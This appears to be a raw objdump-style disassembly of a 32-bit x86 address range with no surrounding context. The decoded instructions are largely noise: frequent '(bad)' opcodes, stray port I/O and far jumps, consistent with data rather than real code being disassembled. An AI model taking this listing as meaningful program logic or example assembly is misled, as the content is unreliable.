  40c943:	in     eax,dx
  40c944:	retf   
  40c945:	xchg   edx,eax
  40c946:	cld    
  40c947:	mov    eax,0x51cce828
  40c94c:	inc    eax
  40c94d:	dec    ebx
  40c94e:	shr    DWORD PTR [edi],1
  40c950:	xchg   BYTE PTR [edi+0x5568a983],cl
  40c956:	stos   DWORD PTR es:[edi],eax
  40c957:	dec    ebx
  40c958:	add    BYTE PTR [ecx-0x44],bh
  40c95b:	fs std 
  40c95d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c95e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c95f:	leave  
  40c960:	add    DWORD PTR [esi+0x3d],esi
  40c963:	or     BYTE PTR [ebx-0x30337d4],ah
  40c969:	ja     0x40c8f9
  40c96b:	(bad)  
  40c96c:	sbb    bh,BYTE PTR [eax+eax*1-0x3efa1b65]
  40c973:	lods   eax,DWORD PTR ds:[esi]
  40c974:	sub    ah,ah
  40c976:	pop    edi
  40c977:	mov    esi,DWORD PTR [ebx+eiz*4-0x7b]
  40c97b:	jns    0x40c95c
  40c97d:	in     eax,dx
  40c97e:	inc    edx
  40c97f:	xchg   edx,eax
  40c980:	jno    0x40c9c7
  40c982:	cmp    al,0x6f
  40c984:	out    0xa8,eax
  40c986:	dec    eax
  40c987:	loopne 0x40c931
  40c989:	pop    es
  40c98a:	adc    edi,DWORD PTR [edi-0x2cc2bf74]
  40c990:	cmp    ch,BYTE PTR [edi+eax*4]
  40c993:	loopne 0x40c9d7
  40c995:	dec    eax
  40c996:	repz mov cl,0xee
  40c999:	sub    esp,DWORD PTR [ebp+ebp*8+0x7163d244]
  40c9a0:	adc    esp,DWORD PTR [ebp+eax*4-0x9]
  40c9a4:	(bad)  
  40c9a5:	stos   BYTE PTR es:[edi],al
  40c9a6:	cmp    DWORD PTR ds:0x553baaec,0xfffffffd
  40c9ad:	pop    esi
  40c9ae:	(bad)  
  40c9af:	jg     0x40c980
  40c9b1:	xor    eax,eax
  40c9b3:	in     eax,dx
  40c9b4:	jae    0x40c986
  40c9b6:	pextrw esp,(bad),0xc5
  40c9b8:	mov    ds:0x7189afb4,al
  40c9bd:	test   eax,0xd5ad298c
  40c9c2:	stos   BYTE PTR es:[edi],al
  40c9c3:	imul   esp,DWORD PTR [esi+eiz*2],0x56
  40c9c7:	pusha  
  40c9c8:	(bad)  
  40c9c9:	aas    
  40c9ca:	les    eax,FWORD PTR [ebp-0x5d]
  40c9cd:	out    0x80,al
  40c9cf:	push   eax
  40c9d0:	jp     0x40ca21
  40c9d2:	push   cs
  40c9d3:	dec    ecx
  40c9d4:	adc    ebp,DWORD PTR [ebx+0x3b]
  40c9d7:	jo     0x40ca12
  40c9d9:	or     al,0x4c
  40c9db:	sbb    DWORD PTR [eax+0xd1843d5],edx
  40c9e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9e2:	sbb    dh,BYTE PTR [edi+0x788caedd]
  40c9e8:	jmp    0x383e:0x1076d907
  40c9ef:	lods   al,BYTE PTR ds:[esi]
  40c9f0:	mov    ebx,ecx
  40c9f2:	das    
  40c9f3:	lock xchg esp,eax
  40c9f5:	cmp    esi,DWORD PTR [edi-0x5e]
  40c9f8:	push   cs
  40c9f9:	pop    ss
  40c9fa:	pop    eax
  40c9fb:	popa   
  40c9fc:	idiv   dh
  40c9fe:	data16 clc 
  40ca00:	add    al,0x49
  40ca02:	shr    ch,0xc0
  40ca05:	sub    BYTE PTR [eax-0x4e90ec37],dl
  40ca0b:	lahf   
  40ca0c:	fbstp  TBYTE PTR [eax-0x5ea5a985]
  40ca12:	loope  0x40ca29
  40ca14:	jecxz  0x40ca34
  40ca16:	cwde   
  40ca17:	sbb    eax,0xe5c2ccab
  40ca1c:	xchg   ecx,eax
  40ca1d:	rcl    bl,cl
  40ca1f:	adc    DWORD PTR [esi+ebp*1-0x77],esp
  40ca23:	outs   dx,BYTE PTR ds:[esi]
  40ca24:	aas    
  40ca25:	stos   BYTE PTR es:[edi],al
  40ca26:	adc    eax,0x7b14504b
  40ca2b:	cld    
  40ca2c:	mov    ?,WORD PTR [ecx-0x69]
  40ca2f:	ret    
  40ca30:	jbe    0x40c9c7
  40ca32:	aas    
  40ca33:	sbb    al,0xff
  40ca35:	ja     0x40ca6b
  40ca37:	sub    edx,ebp
  40ca39:	xchg   ebp,eax
  40ca3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca3b:	mov    bl,al
  40ca3d:	aaa    
  40ca3e:	push   sp
  40ca40:	test   al,0x2b
  40ca42:	into   
  40ca43:	sub    al,cl
  40ca45:	pop    edi
  40ca46:	mov    ds:0xf22b61c3,eax
  40ca4b:	call   0xec8b:0x563dfe8
  40ca52:	push   0x18
  40ca54:	pop    edx
  40ca55:	loop   0x40caae
  40ca57:	retf   0x72c2
  40ca5a:	ret    
  40ca5b:	shl    dl,0xd2
  40ca5e:	cmp    eax,0x3358a3d6
  40ca63:	xor    DWORD PTR [edx],esi
  40ca65:	xchg   esi,eax
  40ca66:	dec    ebp
  40ca67:	mov    bl,0x9d
  40ca69:	mov    ebp,0x4616622d
  40ca6e:	cmc    
  40ca6f:	jmp    0x40ca23
  40ca71:	inc    esi
  40ca72:	iret   
  40ca73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca74:	lea    esp,[esi+0x40]
  40ca77:	mov    ebx,0x17b7c8f3
  40ca7c:	out    0xec,al
  40ca7e:	pop    es
  40ca7f:	and    DWORD PTR [esi+0x1bebaf83],ebx
  40ca85:	rcl    ch,0x70
  40ca88:	fild   QWORD PTR ds:0xf245d732
  40ca8e:	adc    ah,BYTE PTR [edi+0x7f]
  40ca91:	xor    DWORD PTR [edx-0x63],ebp
  40ca94:	loop   0x40ca3d
  40ca96:	dec    ebx
  40ca97:	mov    ds:0x1c72726b,eax
  40ca9c:	sbb    al,0x61
  40ca9e:	sub    al,0x58
  40caa0:	mov    esi,0x2466b110
  40caa5:	fist   DWORD PTR ds:[esi-0x3b]
  40caa9:	mov    al,0x47
  40caab:	popf   
  40caac:	int3   
  40caad:	cmp    eax,0x19efd0dc
  40cab2:	jns    0x40ca36
  40cab4:	and    DWORD PTR [ebp-0x12454bce],eax
  40caba:	jb     0x40caa3
  40cabc:	pop    ebx
  40cabd:	sbb    bl,BYTE PTR [ecx-0x12]
  40cac0:	adc    BYTE PTR [esi+0x61daa68],ch
  40cac6:	cmc    
  40cac7:	in     eax,0x78
  40cac9:	cdq    
  40caca:	loopne 0x40ca6b
  40cacc:	jg     0x40ca95
  40cace:	push   esp
  40cacf:	mov    eax,0x36ab4154
  40cad4:	dec    eax
  40cad5:	popa   
  40cad6:	jo     0x40ca5c
  40cad8:	stc    
  40cad9:	rcr    al,0x73
  40cadc:	rol    bh,1
  40cade:	push   ss
  40cadf:	(bad)  
  40cae0:	int    0x8c
  40cae2:	pushf  
  40cae3:	outs   dx,BYTE PTR ds:[esi]
  40cae4:	cmp    eax,0x5f7062be
  40cae9:	call   0xccbaf091
  40caee:	sahf   
  40caef:	pusha  
  40caf0:	outs   dx,BYTE PTR ds:[esi]
  40caf1:	sti    
  40caf2:	pop    es
  40caf3:	adc    cl,BYTE PTR [ebx+0x6fac7ba0]
  40caf9:	mov    eax,DWORD PTR [edi]
  40cafb:	push   ebp
  40cafc:	push   0x55
  40cafe:	jo     0x40cb24
  40cb00:	sbb    bh,BYTE PTR [ecx+0x7e]
  40cb03:	pusha  
  40cb04:	dec    ebx
  40cb05:	div    BYTE PTR [esi-0x2a3994c0]
  40cb0b:	mov    DWORD PTR [ebp+0x57],ebx
  40cb0e:	std    
  40cb0f:	pop    esp
  40cb10:	aaa    
  40cb11:	mov    esp,0x80f6e749
  40cb16:	cmc    
  40cb17:	sub    edx,ebp
  40cb19:	ja     0x40cb4c
  40cb1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb1c:	push   esi
  40cb1d:	dec    esp
  40cb1e:	rcr    eax,0xab
  40cb21:	adc    edx,DWORD PTR [esi*1+0x1fc60c9c]
  40cb28:	cld    
  40cb29:	bound  edx,QWORD PTR [ecx]
  40cb2b:	stos   DWORD PTR es:[edi],eax
  40cb2c:	idiv   BYTE PTR [ebp+esi*4+0x22]
  40cb30:	xchg   DWORD PTR [esi+ecx*1],esi
  40cb33:	or     DWORD PTR [esi],edx
  40cb35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb36:	dec    esi
  40cb37:	cmp    eax,0xfff703d8
  40cb3c:	push   edx
  40cb3d:	daa    
  40cb3e:	sub    al,0x83
  40cb40:	outs   dx,BYTE PTR ds:[esi]
  40cb41:	cwde   
  40cb42:	jno    0x40cb15
  40cb44:	mov    ah,0xfe
  40cb46:	fistp  WORD PTR [edi-0x65]
  40cb49:	xor    eax,DWORD PTR [ebx]
  40cb4b:	xchg   DWORD PTR [eax],edi
  40cb4d:	call   0xd8ac:0xe32c1c48
  40cb54:	pop    ss
  40cb55:	pop    edi
  40cb56:	leave  
  40cb57:	xchg   ebx,eax
  40cb58:	xchg   esi,eax
  40cb59:	int    0x4a
  40cb5b:	mov    cl,0xa8
  40cb5d:	jns    0x40cb20
  40cb5f:	rcr    DWORD PTR [edi+0x74],cl
  40cb62:	div    DWORD PTR [ebx+0x52b32208]
  40cb68:	or     al,0xed
  40cb6a:	mov    bl,BYTE PTR [ecx-0x364058c8]
  40cb70:	xchg   BYTE PTR [ebp+0x20],ch
  40cb73:	xlat   BYTE PTR ds:[ebx]
  40cb74:	loope  0x40cb62
  40cb76:	test   bl,dl
  40cb78:	jno    0x40cbe5
  40cb7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb7b:	inc    eax
  40cb7c:	int3   
  40cb7d:	fstp   st(2)
  40cb7f:	mov    ss,WORD PTR [eax]
  40cb81:	fcmovbe st,st(7)
  40cb83:	sbb    eax,0xa6609244
  40cb88:	fidiv  WORD PTR ds:0x732c3430
  40cb8e:	(bad)  
  40cb8f:	mov    ah,0xaa
  40cb91:	in     al,0x2a
  40cb93:	cmp    dl,BYTE PTR [esi-0x72]
  40cb96:	adc    al,0x7a
  40cb98:	das    
  40cb99:	lock enter 0x7c33,0x78
  40cb9e:	or     BYTE PTR [ecx+ebp*1+0xed25609],bl
  40cba5:	and    edx,ebp
  40cba7:	cs xor eax,0xace010f0
  40cbad:	loope  0x40cba2
  40cbaf:	add    al,0x78
  40cbb1:	gs pop ss
  40cbb3:	fwait
  40cbb4:	push   eax
  40cbb5:	add    esi,ebx
  40cbb7:	bound  esi,QWORD PTR [edi+ebp*4]
  40cbba:	pop    ebx
  40cbbb:	mov    eax,ds:0x304b00e7
  40cbc0:	mov    ds:0x9ebd165e,al
  40cbc5:	or     esp,ecx
  40cbc7:	cdq    
  40cbc8:	sbb    ecx,DWORD PTR [ebp+0x44]
  40cbcb:	ja     0x40cbea
  40cbcd:	sbb    DWORD PTR [ecx+eiz*1],esp
  40cbd0:	push   edi
  40cbd1:	jns    0x40cc35
  40cbd3:	adc    DWORD PTR [ebx],0xead104a8
  40cbd9:	xor    al,0xaf
  40cbdb:	lock xchg ecx,eax
  40cbdd:	add    ah,dh
  40cbdf:	in     al,0x31
  40cbe1:	dec    ecx
  40cbe2:	mov    eax,0xb79ff296
  40cbe7:	out    dx,al
  40cbe8:	sbb    al,bl
  40cbea:	jg     0x40cbb2
  40cbec:	setnp  dh
  40cbef:	or     DWORD PTR [edi+edi*4+0x19],ebx
  40cbf3:	inc    ebx
  40cbf4:	xchg   esi,eax
  40cbf5:	jns    0x40cc1e
  40cbf7:	dec    eax
  40cbf8:	adc    BYTE PTR [ebp+0x4cc68e8a],bl
  40cbfe:	shl    BYTE PTR ds:0x3313d78d,0x1e
  40cc05:	sti    
  40cc06:	(bad)  
  40cc07:	je     0x40cc09
  40cc09:	mov    al,0xa6
  40cc0b:	jmp    0x777b:0xafea
  40cc11:	or     eax,DWORD PTR [esi+eiz*2-0x3c]
  40cc15:	bound  esi,QWORD PTR [edx]
  40cc17:	test   eax,0x204fbaba
  40cc1c:	xchg   edx,eax
  40cc1d:	push   edi
  40cc1e:	xchg   ebp,eax
  40cc1f:	mov    edx,0xb15f95fc
  40cc24:	mov    al,0x46
  40cc26:	ret    
  40cc27:	fnstenv ds:0x89bcdc1e
  40cc2d:	(bad)  [edi-0x57485afe]
  40cc33:	nop
  40cc34:	push   ebp
  40cc35:	inc    BYTE PTR [esi+0x4c]
  40cc38:	push   esp
  40cc39:	into   
  40cc3a:	mov    edx,0x153cced3
  40cc3f:	mov    bl,0x93
  40cc41:	mov    bh,0x7f
  40cc43:	dec    eax
  40cc44:	mov    ah,0x97
  40cc46:	nop
  40cc47:	adc    al,0x50
  40cc49:	mov    esi,0x52bc93d8
  40cc4e:	cmp    dl,BYTE PTR [ecx+0x1c1fdf0d]
  40cc54:	hlt    
  40cc55:	or     al,0xe2
  40cc57:	inc    eax
  40cc58:	(bad)  
  40cc59:	mov    bl,0x67
  40cc5b:	sti    
  40cc5c:	rcl    dh,1
  40cc5e:	clc    
  40cc5f:	or     bh,BYTE PTR [eax]
  40cc61:	xor    eax,0xac221a78
  40cc66:	js     0x40cc69
  40cc68:	popa   
  40cc69:	add    dl,BYTE PTR [ebx-0x23]
  40cc6c:	add    ch,BYTE PTR [edx-0x73259bca]
  40cc72:	mov    eax,DWORD PTR [esi]
  40cc74:	dec    edi
  40cc75:	sbb    bl,BYTE PTR [edi-0x55ac8024]
  40cc7b:	xor    ecx,ecx
  40cc7d:	in     al,0xe6
  40cc7f:	adc    DWORD PTR [edi+0x6a],edi
  40cc82:	into   
  40cc83:	mov    ah,BYTE PTR [ecx]
  40cc85:	push   ebp
  40cc86:	adc    cl,BYTE PTR [esi+0x16]
  40cc89:	in     eax,0x6c
  40cc8b:	or     BYTE PTR [esi],dh
  40cc8d:	sub    edx,DWORD PTR [ebx]
  40cc8f:	inc    esi
  40cc90:	mov    eax,0x2a9ca35d
  40cc95:	clc    
  40cc96:	jg     0x40cc86
  40cc98:	es scas al,BYTE PTR es:[edi]
  40cc9a:	dec    ecx
  40cc9b:	mov    al,ds:0x5847ab93
  40cca0:	vmread DWORD PTR [ebp-0x3c],ecx
  40cca4:	sub    eax,0xf34d56b8
  40cca9:	test   BYTE PTR [ebp+0x180ace55],al
  40ccaf:	jmp    0xd2c5fafa
  40ccb4:	mov    cl,0xbc
  40ccb6:	lods   eax,DWORD PTR ds:[esi]
  40ccb7:	push   ebp
  40ccb8:	jg     0x40cd0a
  40ccba:	shr    dl,cl
  40ccbc:	mov    WORD PTR [ebx],cs
  40ccbe:	cld    
  40ccbf:	(bad)  
  40ccc0:	cmc    
  40ccc1:	bound  esi,QWORD PTR [edx+0x4e]
  40ccc4:	fdivr  st,st(6)
  40ccc6:	popa   
  40ccc7:	pop    ss
  40ccc8:	push   ds
  40ccc9:	mov    dl,0xbe
  40cccb:	ja     0x40cce1
  40cccd:	leave  
  40ccce:	aas    
  40cccf:	cdq    
  40ccd0:	and    ebp,DWORD PTR [ebx]
  40ccd2:	cmp    BYTE PTR [edx+eax*1-0x1c62448d],bh
  40ccd9:	cmc    
  40ccda:	pop    edx
  40ccdb:	repz rcl BYTE PTR [edx],1
  40ccde:	ror    BYTE PTR [ebp+edx*4-0x37d9d87d],cl
  40cce5:	pop    ss
  40cce6:	mov    DWORD PTR [esi+0x2897b07d],0xd7b0add9
  40ccf0:	and    BYTE PTR [ebx+0x17],al
  40ccf3:	jo     0x40ccd0
  40ccf5:	sti    
  40ccf6:	std    
  40ccf7:	imul   eax,DWORD PTR [edi-0x3a],0x8
  40ccfb:	and    eax,0x55c55127
  40cd01:	adc    BYTE PTR [eax-0x69],ch
  40cd04:	shr    ch,1
  40cd06:	mov    bl,0x4e
  40cd08:	cwde   
  40cd09:	aam    0xd7
  40cd0b:	or     cl,BYTE PTR [esi+0x32]
  40cd0e:	or     DWORD PTR [eax-0x75],ebp
  40cd11:	sahf   
  40cd12:	or     eax,0x7c8d4667
  40cd17:	scas   al,BYTE PTR es:[edi]
  40cd18:	fidivr DWORD PTR [esi]
  40cd1a:	sbb    al,0x94
  40cd1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd1d:	aam    0xf7
  40cd1f:	mov    edx,0xcc78fd31
  40cd24:	sub    dh,dh
  40cd26:	xor    eax,0xc2f7d79e
  40cd2b:	mov    edx,0x55117bb1
  40cd30:	fxtract 
  40cd32:	or     DWORD PTR [ebp-0x2c],ebx
  40cd35:	xor    ebp,ebx
  40cd37:	cmp    DWORD PTR [ebp+0x2af575ea],esi
  40cd3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd3e:	pop    edi
  40cd3f:	fidiv  DWORD PTR [ebx+0x3]
  40cd42:	or     ebx,edx
  40cd44:	pop    ss
  40cd45:	iret   
  40cd46:	pop    edi
  40cd47:	dec    edi
  40cd48:	mov    eax,0x1f8e0aa1
  40cd4d:	add    BYTE PTR [esi],al
  40cd4f:	push   edi
  40cd50:	shl    DWORD PTR [edx-0x585c6ac],0xd5
  40cd57:	dec    edi
  40cd58:	and    edx,DWORD PTR [ebp-0x29]
  40cd5b:	stos   BYTE PTR es:[edi],al
  40cd5c:	fs lock cmp eax,0x332c2154
  40cd63:	retf   0xd1df
  40cd66:	jns    0x40cdd2
  40cd68:	push   cs
  40cd69:	test   BYTE PTR [ebp-0x47],bl
  40cd6c:	pushf  
  40cd6d:	mov    eax,0xe3b65d6
  40cd72:	ins    BYTE PTR es:[edi],dx
  40cd73:	into   
  40cd74:	or     esi,eax
  40cd76:	retf   
  40cd77:	(bad)  [esi+0x5284a41b]
  40cd7d:	in     eax,0xed
  40cd7f:	mov    ds:0xe7676a2e,al
  40cd84:	and    al,0x6f
  40cd86:	jg     0x40cd0a
  40cd88:	fidiv  WORD PTR [ebp-0x30da4e42]
  40cd8e:	(bad)  
  40cd8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd90:	jns    0x40ce0f
  40cd92:	xchg   esp,eax
  40cd93:	(bad)  
  40cd94:	hlt    
  40cd95:	ret    
  40cd96:	jl     0x40cd87
  40cd98:	or     al,BYTE PTR [esi-0x5a214a25]
  40cd9e:	or     DWORD PTR [ecx-0x9],ecx
  40cda1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cda2:	jbe    0x40cdc2
  40cda4:	push   es
  40cda5:	xchg   edx,eax
  40cda6:	mov    DWORD PTR [ebp-0x4a6fb5fa],ecx
  40cdac:	sub    eax,0x7d90361c
  40cdb1:	cs sti 
  40cdb3:	inc    esp
  40cdb4:	mov    ecx,0x67382133
  40cdb9:	test   eax,0xd9830160
  40cdbe:	ror    DWORD PTR [edx],cl
  40cdc0:	fwait
  40cdc1:	mov    bl,0x2f
  40cdc3:	mov    al,0xfa
  40cdc5:	ret    0xec09
  40cdc8:	lods   al,BYTE PTR ds:[esi]
  40cdc9:	sub    al,0x30
  40cdcb:	mov    eax,0x831d329e
  40cdd0:	sbb    eax,0x6ef132c2
  40cdd5:	dec    esi
  40cdd6:	bnd call 0x7bc45f5a
  40cddc:	lods   eax,DWORD PTR ds:[esi]
  40cddd:	sbb    bh,ah
  40cddf:	cmp    eax,0x218b7209
  40cde4:	retf   0x6900
  40cde7:	pop    eax
  40cde8:	cmc    
  40cde9:	and    eax,0xfdb11a8a
  40cdee:	xor    BYTE PTR [ecx],bh
  40cdf0:	mov    dl,0x10
  40cdf2:	jne    0x40cde2
  40cdf4:	cmp    edx,DWORD PTR [ecx]
  40cdf6:	xlat   BYTE PTR ds:[ebx]
  40cdf7:	sub    al,0xac
  40cdf9:	in     eax,dx
  40cdfa:	cmp    eax,0x3ad0ed46
  40cdff:	lea    edx,[edi]
  40ce01:	les    esi,FWORD PTR [ecx+0x500eb0f8]
  40ce07:	inc    ebp
  40ce08:	cmp    DWORD PTR [edx+0x30],eax
  40ce0b:	shl    DWORD PTR [eax+0xf71ea58],1
  40ce11:	cwde   
  40ce12:	nop
  40ce13:	sbb    dh,BYTE PTR [edi+0x70]
  40ce16:	inc    esp
  40ce17:	pop    esp
  40ce18:	mov    ecx,DWORD PTR [edx]
  40ce1a:	sub    ecx,edi
  40ce1c:	inc    esi
  40ce1d:	mov    ds:0x4ec60965,eax
  40ce22:	sub    eax,0x486f977c
  40ce27:	mov    ds:0xd1931ade,al
  40ce2c:	cmp    eax,0xf8ac20c
  40ce31:	mov    al,ds:0x8cdfee22
  40ce36:	push   cs
  40ce37:	inc    ecx
  40ce38:	and    eax,0x612a6639
  40ce3d:	mov    BYTE PTR [edx+0x2bb395fa],al
  40ce43:	fist   WORD PTR [edx]
  40ce45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce46:	fisttp DWORD PTR [ebx]
  40ce48:	shl    edx,1
  40ce4a:	retf   0xa112
  40ce4d:	cmp    edi,ecx
  40ce4f:	adc    eax,0xf3938b7e
  40ce54:	sbb    esi,esi
  40ce56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce57:	call   0xbc9a:0x11f4179
  40ce5e:	add    BYTE PTR [esi-0x2f568efb],dl
  40ce64:	jge    0x40ce12
  40ce66:	fs add al,0x1f
  40ce69:	pop    edx
  40ce6a:	add    eax,0x7bee05a7
  40ce6f:	sub    eax,0xa5aa73c8
  40ce74:	inc    ebx
  40ce75:	and    eax,0x24722c6d
  40ce7a:	ficomp WORD PTR ds:0xf2c20706
  40ce80:	sub    eax,0x64eaf44b
  40ce85:	xchg   ebx,eax
  40ce86:	xor    eax,0xc8d077c2
  40ce8b:	mov    ds,WORD PTR [ebp+esi*2+0x76]
  40ce8f:	leave  
  40ce90:	adc    al,0x30
  40ce92:	test   BYTE PTR [ebp-0x69ccab05],0xe2
  40ce99:	adc    DWORD PTR [ecx+0x24],ebx
  40ce9c:	cmp    eax,0x526d2034
  40cea1:	jns    0x40cf0a
  40cea3:	and    DWORD PTR [edx],ebx
  40cea5:	xchg   esp,eax
  40cea6:	and    dl,bh
  40cea8:	pop    ss
  40cea9:	and    BYTE PTR [esi-0x30],dl
  40ceac:	jno    0x40ceb8
  40ceae:	test   DWORD PTR [eax+0x468ae8e3],esi
  40ceb4:	data16 mov ch,0xef
  40ceb7:	mov    eax,ds:0x3d27cb6b
  40cebc:	push   es
  40cebd:	imul   eax,ebx,0x37a8049a
  40cec3:	dec    edi
  40cec4:	rcl    DWORD PTR [eax+0x584fa886],0xb5
  40cecb:	mov    esi,0xfc166866
  40ced0:	cdq    
  40ced1:	or     dl,BYTE PTR [ebx+0x76]
  40ced4:	inc    edi
  40ced5:	mov    eax,0x9bd0fe0d
  40ceda:	jmp    0xd55e:0x9023e3d7
  40cee1:	xor    eax,0x8113400f
  40cee6:	mov    eax,ss
  40cee8:	push   cs
  40cee9:	push   ss
  40ceea:	loop   0x40ce6d
  40ceec:	dec    DWORD PTR [edx-0x7c]
  40ceef:	(bad)  
  40cef0:	(bad)  
  40cef1:	pop    eax
  40cef2:	xor    DWORD PTR [edi+0x55],edx
  40cef5:	mov    esp,0x566cb8d4
  40cefa:	test   eax,0xc87be25c
  40ceff:	inc    edx
  40cf00:	pop    ds
  40cf01:	popa   
  40cf02:	mov    eax,ds:0xbc055087
  40cf07:	aaa    
  40cf08:	xchg   BYTE PTR [esi+ecx*2+0x6dd2fb4c],ch
  40cf0f:	stos   BYTE PTR es:[edi],al
  40cf10:	jg     0x40cf61
  40cf12:	mov    ebp,0xd91adde6
  40cf17:	pop    ss
  40cf18:	cwde   
  40cf19:	mov    ebp,0x2bf7155a
  40cf1e:	dec    ebx
  40cf1f:	jbe    0x40cf86
  40cf21:	or     esi,eax
  40cf23:	mov    eax,ds:0xbb88a588
  40cf28:	dec    edx
  40cf29:	repnz mov eax,ds:0x2facf6e6
  40cf2f:	sub    eax,0x4eeab5a
  40cf34:	aaa    
  40cf35:	jmp    FWORD PTR [edx-0x226cfa4e]
  40cf3b:	dec    eax
  40cf3c:	nop
  40cf3d:	jbe    0x40cf77
  40cf3f:	retf   0x208a
  40cf42:	jge    0x40cf99
  40cf44:	call   0x863b06d9
  40cf49:	pop    edi
  40cf4a:	lods   eax,DWORD PTR ds:[esi]
  40cf4b:	popf   
  40cf4c:	sub    DWORD PTR [edx],edx
  40cf4e:	(bad)  
  40cf4f:	jl     0x40cf0a
  40cf51:	leave  
  40cf52:	push   ebp
  40cf53:	xchg   esp,eax
  40cf54:	dec    esp
  40cf55:	fsubr  QWORD PTR [eax-0x50761c53]
  40cf5b:	into   
  40cf5c:	add    al,0x5a
  40cf5e:	cmp    esi,esi
  40cf60:	fisttp QWORD PTR [ebx-0x3f]
  40cf63:	rol    DWORD PTR [esi+0x29],1
  40cf66:	dec    ecx
  40cf67:	xor    eax,0xebab286c
  40cf6c:	leave  
  40cf6d:	in     al,0xa7
  40cf6f:	jle    0x40cf84
  40cf71:	not    edi
  40cf73:	jecxz  0x40cf84
  40cf75:	mov    cl,0x9b
  40cf77:	or     dl,BYTE PTR [edi-0x4d]
  40cf7a:	repnz loop 0x40cf01
  40cf7d:	sar    DWORD PTR [ecx+0x14],1
  40cf80:	ss cmp eax,0xcb683fff
  40cf86:	inc    esp
  40cf87:	(bad)  
  40cf88:	pop    edi
  40cf89:	fwait
  40cf8a:	cmp    bh,cl
  40cf8c:	mov    bl,0x3
  40cf8e:	mov    cl,0x23
  40cf90:	lds    edi,FWORD PTR [ebx+0x10f2fbbb]
  40cf96:	push   eax
  40cf97:	call   0xa6e628e5
  40cf9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf9d:	(bad)  
  40cf9e:	enter  0x3a6,0x17
  40cfa2:	mov    bl,0x13
  40cfa4:	in     al,0x46
  40cfa6:	inc    eax
  40cfa7:	sub    DWORD PTR [ebx+0x46bcb0f2],0xcd7b31f
  40cfb1:	sahf   
  40cfb2:	stos   BYTE PTR es:[edi],al
  40cfb3:	mov    ebx,DWORD PTR [edx+0x1ecb2656]
  40cfb9:	mov    al,ds:0xd78fa0d6
  40cfbe:	sbb    al,0x15
  40cfc0:	daa    
  40cfc1:	jmp    0x6dbb:0x30d63240
  40cfc8:	ins    BYTE PTR es:[edi],dx
  40cfc9:	in     al,dx
  40cfca:	ins    DWORD PTR es:[edi],dx
  40cfcb:	xchg   BYTE PTR [edi+0x7f3e1bc4],dh
  40cfd1:	pusha  
  40cfd2:	mov    ah,0xcd
  40cfd4:	push   eax
  40cfd5:	jp     0x40cfae
  40cfd7:	push   eax
  40cfd8:	cdq    
  40cfd9:	xor    al,BYTE PTR [edx-0x7f]
  40cfdc:	mov    esi,0x552f413d
  40cfe1:	mov    edi,0xbf6663f8
  40cfe6:	add    eax,0x313fde3d
  40cfeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfec:	sar    BYTE PTR [eax+0x1baac913],1
  40cff2:	out    dx,eax
  40cff3:	dec    ecx
  40cff4:	in     eax,dx
  40cff5:	push   edi
  40cff6:	jno    0x40cf92
  40cff8:	iret   
  40cff9:	sbb    eax,0x58dea353
  40cffe:	xor    al,0xb1
  40d000:	pusha  
  40d001:	lahf   
  40d002:	and    eax,0x902729be
  40d007:	repz lea esi,[edi+0x68]
  40d00b:	stc    
  40d00c:	add    esp,DWORD PTR [edi+0x7c45c470]
  40d012:	gs pop es
  40d014:	pop    esi
  40d015:	push   ss
  40d016:	daa    
  40d017:	call   0x5d6e:0xf87fec31
  40d01e:	and    bh,ah
  40d020:	test   al,0x20
  40d022:	sbb    DWORD PTR ds:0xe9f0aee4,esi
  40d028:	cli    
  40d029:	shr    DWORD PTR ss:[edi+0x6e],0x60
  40d02e:	push   0xffffff87
  40d030:	sti    
  40d031:	cmc    
  40d032:	arpl   WORD PTR [ebx],ax
  40d034:	scas   eax,DWORD PTR es:[edi]
  40d035:	inc    edx
  40d036:	xchg   ecx,eax
  40d037:	mov    BYTE PTR [ebx],cl
  40d039:	jmp    DWORD PTR [edi+eax*2]
  40d03c:	add    BYTE PTR [edi+eax*8],bl
  40d03f:	(bad)  
  40d040:	xlat   BYTE PTR ds:[ebx]
  40d041:	sub    bl,BYTE PTR [esi]
  40d043:	push   esp
  40d044:	sbb    esi,DWORD PTR [ebx-0x54]
  40d047:	(bad)  
  40d048:	imul   ebx,DWORD PTR [ebx+edi*1],0x87bbc709
  40d04f:	fstp   TBYTE PTR [esi]
  40d051:	pop    esp
  40d052:	xlat   BYTE PTR ds:[ebx]
  40d053:	(bad)  
  40d054:	pop    edx
  40d055:	cmc    
  40d056:	add    bh,bl
  40d058:	into   
  40d059:	ficomp DWORD PTR [edi]
  40d05b:	dec    edi
  40d05c:	mov    al,0xdd
  40d05e:	or     DWORD PTR [esi],ebp
  40d060:	xor    bl,BYTE PTR [edi]
  40d062:	xor    dl,bl
  40d064:	mov    cl,0xce
  40d066:	xor    BYTE PTR [eax-0x6307132a],bl
  40d06c:	mov    ah,0xe8
  40d06e:	dec    ecx
  40d06f:	xor    eax,0x89839318
  40d074:	pop    edi
  40d075:	js     0x40d0e0
  40d077:	mov    ds:0x7ea00a89,eax
  40d07c:	jecxz  0x40d037
  40d07e:	in     eax,0xc4
  40d080:	or     ebx,edi
  40d082:	mov    ebp,0xe7141f5c
  40d087:	test   DWORD PTR [ebp+0x124cdcd8],ecx
  40d08d:	into   
  40d08e:	mov    dl,0x46
  40d090:	inc    ebx
  40d091:	test   BYTE PTR [esi],bl
  40d093:	arpl   WORD PTR [ecx],ax
  40d095:	cmovg  ecx,DWORD PTR [esi-0x7e05699]
  40d09c:	pop    ecx
  40d09d:	imul   ecx,edx,0xffffffb6
  40d0a0:	jle    0x40d105
